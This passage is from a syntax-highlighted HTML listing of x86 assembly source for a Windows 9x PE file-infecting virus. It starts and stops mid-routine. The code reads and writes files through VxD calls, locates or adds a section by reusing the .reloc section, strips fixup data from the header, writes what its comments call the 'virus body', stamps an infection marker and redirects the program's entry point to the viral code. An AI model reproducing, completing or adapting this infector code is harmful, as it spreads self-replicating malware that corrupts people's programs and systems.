        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0">             </span><span class="sc1">; on object table</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; how many sections</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">                          </span><span class="sc1">; humm, if so it should not</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">search_reloc</span><span class="sc0">                    </span><span class="sc1">; be enough our 1kb buffer</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; correct stack and exit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">closefile</span><span class="sc0">

</span><span class="sc5">search_reloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'ler.'</span><span class="sc0">          </span><span class="sc1">; search the .reloc</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_rel</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'co'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_reloc</span><span class="sc0">
</span><span class="sc5">no_rel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">search_reloc</span><span class="sc0">

</span><span class="sc5">no_reloc_present</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; if no .reloc or .reloc not last one or if we shouldn't put out jump near the</span><span class="sc0">
</span><span class="sc1">; entry point then we must add an object</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; obj number</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">put_virsize</span><span class="sc0">

</span><span class="sc5">got_reloc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; if got .reloc and is the last one then just overwrite this one.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; must be last one!</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_rel</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; physical offset where we</span><span class="sc0">
                                                </span><span class="sc1">; will write virus code</span><span class="sc0">
</span><span class="sc5">find_rightone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d600h</span><span class="sc0">                      </span><span class="sc1">; read 208h bytes out of the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; .reloc section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; orig EIP</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">have_the_one</span><span class="sc0">                    </span><span class="sc1">; got one! or if &lt; then just</span><span class="sc0">
                                                </span><span class="sc1">; exit, since no near block</span><span class="sc0">
                                                </span><span class="sc1">; present</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_rightone</span><span class="sc0">

</span><span class="sc5">have_the_one</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0a0h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; delete fixups infos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0a4h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; in header</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">virus_size</span><span class="sc0">       </span><span class="sc1">; compare phys. size</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">put_reloc_size</span><span class="sc0">

</span><span class="sc5">put_virsize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virus_size</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">set_ph_size</span><span class="sc0">

</span><span class="sc5">put_reloc_size</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; so the physical size</span><span class="sc0">
                                                        </span><span class="sc1">; will fit the real</span><span class="sc0">
                                                        </span><span class="sc1">; size on disk</span><span class="sc0">
</span><span class="sc5">set_ph_size</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">phy_size</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">no_change_reloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; begin of objects in mem</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; so -eax = lenght of all objs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; where the first</span><span class="sc0">
                                                          </span><span class="sc1">; object starts</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">obj_size</span><span class="sc0">                    </span><span class="sc1">; enough space in object table</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">closefile</span><span class="sc0">                       </span><span class="sc1">; for object + loader?</span><span class="sc0">

        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">obj_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0f8h</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; + PE hdr + our code</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; be sure that enough header</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">enough_header</span><span class="sc0">                     </span><span class="sc1">; is loaded in memory</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">54h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0">      </span><span class="sc1">; so add just enough :)</span><span class="sc0">

</span><span class="sc5">enough_header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">starthigh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">obj_rva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; location in PeHeader of new section header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">object_begin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">obj_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; save the size</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
       
</span><span class="sc1">; Extend the file to the file alignment if needed (of course not if</span><span class="sc0">
</span><span class="sc1">; overwriting the .reloc)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0d601h</span><span class="sc0">              </span><span class="sc1">; filewrite</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">starthigh</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">aligned</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">              </span><span class="sc1">; put alignment</span><span class="sc0">
</span><span class="sc5">aligned</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">           </span><span class="sc1">; write virus body</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; write tsr check byte zeroed</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">needed_zero</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxdcall_io</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc12">'0z0b'</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; - offset in mem + our object size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; EAX = new EIP</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; new EIP</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">jmp_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">change_in_pe</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; orig EIP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">                  </span><span class="sc1">; is the same 4k block?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">change_in_pe</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0fffh</span><span class="sc0">                       </span><span class="sc1">; just last 12 bits</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">relocs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">rel_pos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">another_reloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc5">rel_pos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">starthigh</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">

